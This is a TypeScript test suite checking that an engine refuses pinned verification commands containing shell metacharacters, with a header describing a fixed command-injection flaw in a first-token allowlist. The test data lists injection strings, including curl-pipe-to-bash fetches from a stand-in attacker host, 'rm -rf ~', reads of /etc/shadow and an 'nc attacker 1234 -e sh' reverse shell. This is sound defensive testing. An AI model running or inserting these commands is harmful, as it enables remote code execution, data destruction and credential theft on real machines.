/**
 * CONFORMANCE — 0.2c: a pinned verification command is a COMMAND, not a script.
 *
 * D7 is the load-bearing claim of the whole product: "Verification commands are
 * pinned at the spec-approval gate into Rules-layer data. The runner executes only
 * pinned, allowlisted commands." The docs describe the runner's check as an
 * "allowlist". It was not one. The runner took the FIRST WHITESPACE TOKEN of the
 * pinned string, checked that against a list, and then handed the WHOLE ORIGINAL
 * STRING to `bash -c`:
 *
 *     const binary = command.trim().split(/\s+/)[0] ?? '';
 *     if (!args.allowlist.includes(binary)) { …refuse… }
 *     spawnSync('bash', ['-c', command], …)
 *
 * So `pnpm test; curl http://x | bash` passed the allowlist on the strength of
 * `pnpm`. The list also contained `sh` and `bash` outright, which made it
 * self-defeating by construction. The consequence: holding `gate.spec.approve`
 * was equivalent to arbitrary code execution on every machine that runs a claim
 * for that item — in BYO mode, the operator's own machine, in the process that
 * holds the push credential and the ssh-agent socket.
 *
 * This suite pins the rule at the ENGINE, not only at the wire: the pin is
 * Rules-layer data (D7), so the constraint belongs where the data is written, and
 * every surface (HTTP, MCP, CLI, runner) inherits it from one place.
 *
 * Composition is the ARRAY, not the shell: `pinnedVerification` is a list, so two
 * commands are two entries. That is why refusing `&&` costs nothing — it removes a
 * second, unconstrained way to express what the data model already expresses.
 */
import { describe, expect, it } from 'vitest';
import {
  createEngine,
  GuardFailedError,
  type Actor,
  type Feature,
  type SpineEngine,
  type WorkItem,
} from '../src/index.js';

interface Rig {
  engine: SpineEngine;
  po: Actor;
  feature: Feature;
}

function rig(): Rig {
  const engine = createEngine();
  const po = engine.createActor({ type: 'user', displayName: 'PO' });
  for (const permission of ['feature.init', 'task.plan', 'task.advance', 'gate.spec.approve'] as const) {
    engine.grant({ actorId: po.id, permission });
  }
  const feature = engine.createFeature({ actorId: po.id });
  return { engine, po, feature };
}

function draft(r: Rig, key = 's-1'): WorkItem {
  const wi = r.engine.createWorkItem({
    featureId: r.feature.id,
    externalKey: key,
    title: `Story ${key}`,
    actorId: r.po.id,
    specCheckpoint: true,
  });
  return r.engine.advanceState({ workItemId: wi.id, to: 'draft', actorId: r.po.id });
}

function pin(r: Rig, workItemId: string, commands: string[]): WorkItem {
  return r.engine.approveGate({
    workItemId,
    gate: 'spec_approval',
    actorId: r.po.id,
    pinnedVerification: commands,
  });
}

describe('pinned verification commands reject shell metacharacters (0.2c, D7)', () => {
  // Each of these passed the old first-token allowlist on the strength of `pnpm`.
  const injections: Array<[string, string]> = [
    ['command chaining with ;', 'pnpm test; curl http://attacker/x | bash'],
    ['conditional chaining with &&', 'pnpm test && rm -rf ~'],
    ['a pipe', 'pnpm test | tee /tmp/out'],
    ['command substitution $()', 'pnpm test $(curl http://attacker/x)'],
    ['backtick substitution', 'pnpm test `whoami`'],
    ['output redirection', 'pnpm test > /etc/passwd'],
    ['input redirection', 'pnpm test < /etc/shadow'],
    ['a newline (a second line is a second command)', 'pnpm test\ncurl http://attacker/x | bash'],
    ['background execution with &', 'pnpm test & curl http://attacker/x'],
    ['variable expansion', 'pnpm test $HOME/../../etc'],
  ];

  for (const [label, command] of injections) {
    it(`refuses ${label}`, () => {
      const r = rig();
      const item = draft(r);
      expect(() => pin(r, item.id, [command])).toThrow(GuardFailedError);
      // Nothing was pinned and the gate did not fire — a denied write mutates
      // nothing (the Phase 1 pin), so a rejected pin cannot half-approve a spec.
      const after = r.engine.getWorkItem(item.id);
      expect(after.pinnedVerification).toBeNull();
      expect(after.state).toBe('draft');
    });
  }

  it('refuses an injection hidden in the SECOND entry of the array', () => {
    const r = rig();
    const item = draft(r);
    // A reviewer skimming a diff reads the first entry and stops.
    expect(() => pin(r, item.id, ['pnpm -C packages/core test', 'pnpm lint; nc attacker 1234 -e sh'])).toThrow(
      GuardFailedError,
    );
    expect(r.engine.getWorkItem(item.id).pinnedVerification).toBeNull();
  });

  it('refuses a command whose first token is not on the allowlist', () => {
    const r = rig();
    const item = draft(r);
    expect(() => pin(r, item.id, ['curl http://attacker/x'])).toThrow(GuardFailedError);
  });

  it('refuses `sh` and `bash` as the command itself — the allowlist no longer contains them', () => {
    const r = rig();
    // An allowlist that permits a shell permits everything, so the shells are gone
    // from it. This is the finding that made the old list decorative.
    for (const [i, command] of ['sh -c "curl http://attacker/x"', 'bash ./ci.sh'].entries()) {
      const item = draft(r, `sh-${String(i)}`);
      expect(() => pin(r, item.id, [command])).toThrow(GuardFailedError);
    }
  });

  it('accepts the ordinary commands the product actually documents', () => {
    const r = rig();
    // README:72 and every delivery/ story pin this shape.
    const item = draft(r);
    const approved = pin(r, item.id, ['pnpm -C packages/core test', 'pnpm -r --filter "@oahs/*" run typecheck']);
    expect(approved.pinnedVerification).toEqual([
      'pnpm -C packages/core test',
      'pnpm -r --filter "@oahs/*" run typecheck',
    ]);
    // The gate still fired: valid data must not be made harder to write.
    expect(approved.state).toBe('ready_for_dev');
  });

  it('accepts a quoted argument containing no metacharacters', () => {
    const r = rig();
    const item = draft(r);
    // Quotes themselves are fine — they are how argv carries a spaced argument.
    // What is refused is the shell OPERATORS that turn one command into several.
    const approved = pin(r, item.id, ['pytest -k "not slow"']);
    expect(approved.pinnedVerification).toEqual(['pytest -k "not slow"']);
  });

  it('two commands are two ENTRIES — the array is the composition mechanism', () => {
    const r = rig();
    const item = draft(r);
    // The legitimate use of `&&` has a first-class expression, which is why
    // refusing the operator removes capability from an attacker and none from a PO.
    const approved = pin(r, item.id, ['pnpm build', 'pnpm test']);
    expect(approved.pinnedVerification).toEqual(['pnpm build', 'pnpm test']);
  });
});
